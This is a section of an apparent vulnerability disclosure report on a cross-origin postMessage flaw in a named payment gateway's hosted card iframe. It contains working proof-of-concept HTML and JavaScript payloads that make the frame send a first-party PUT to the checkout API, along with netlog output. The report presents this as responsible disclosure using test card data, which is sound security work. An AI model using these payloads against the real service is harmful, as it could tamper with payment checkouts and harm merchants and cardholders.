---

## 8. Reproduction — concrete evidence of the state-changing call

> The netlog capture referenced by earlier notes was not retained as a raw file
> (`.har` / netlog) and this report is self-contained by design. The record below
> is the captured observation, reproduced verbatim from the session notes.

### Step 1 — confirm the channel is reachable cross-origin

From **any** origin (the proof used `https://127.0.0.1:8443`), frame the shell
and dispatch one message:

```html
<iframe src="https://gateway.sumup.com/"></iframe>
<script>
  document.querySelector('iframe').contentWindow.postMessage(
    { type: "SumUpCard", message: "form--submit" }, "*"
  );
</script>
```

Observed in SumUp's own iframe console
(`source: https://gateway.sumup.com/hosted.js`):

```
Error while receiving message:  - form--submit
Error: Unable to process checkout without a valid checkoutId
```

The handler **executed the attacker's message**. It only stopped because
`checkoutId` was absent — not because the origin was untrusted.

### Step 2 — supply the fields and observe the outbound PUT

`checkoutId` is read from `payment.checkoutId` (not top level). Supplying it:

```js
contentWindow.postMessage({
  type: "SumUpCard",
  message: "form--submit",
  value: {
    sessionId: "poc-invalid-session-0000",
    product: { appId: "x" },
    payment: {
      checkoutId: "11111111-2222-4333-8444-555555555555",
      card: { number: "4111111111111111", expiryMonth: "12",
              expiryYear: "2030", cvv: "111" }
    }
  }
}, "*")
```

Chrome netlog records:

```
PUT /v0.2/checkouts/11111111-2222-4333-8444-555555555555 HTTP/1.1
  initiator              : https://gateway.sumup.com
  network_isolation_key  : "https://127.0.0.1 https://sumup.com"
  cors_preflight_policy  : consider_preflight
  X-Sumup-Correlation-Id : <attacker-chosen>
  X-SumUp-Widget-Session-Id: poc-invalid-session-0000
  Sumup-Product-Origin   : undefined
```

API base is hardcoded to `https://api.sumup.com`.

Three things to note for triage:

1. The **`initiator` is first-party** (`gateway.sumup.com`), so the request
   carries the frame's own authority, not the attacker's.
2. `network_isolation_key` contains **both** origins, confirming the dispatch
   genuinely crossed the boundary — the attacker origin is in the key.
3. `Sumup-Product-Origin: undefined` and the absent `session_id` show the PUT is
   **not a faithful merchant replay** (see §5).

**Safety of this PoC.** It uses the standard documented test PAN
`4111111111111111` and an explicitly invalid session id. It issues one PUT that
is rejected upstream. No real checkout, no merchant funds, no card data of any
value. The checkout id is a synthetic UUID that does not exist — confirmed by
`api.sumup.com/v0.2/checkouts/{id}` returning 404 to every credential variant
tried.
EOF
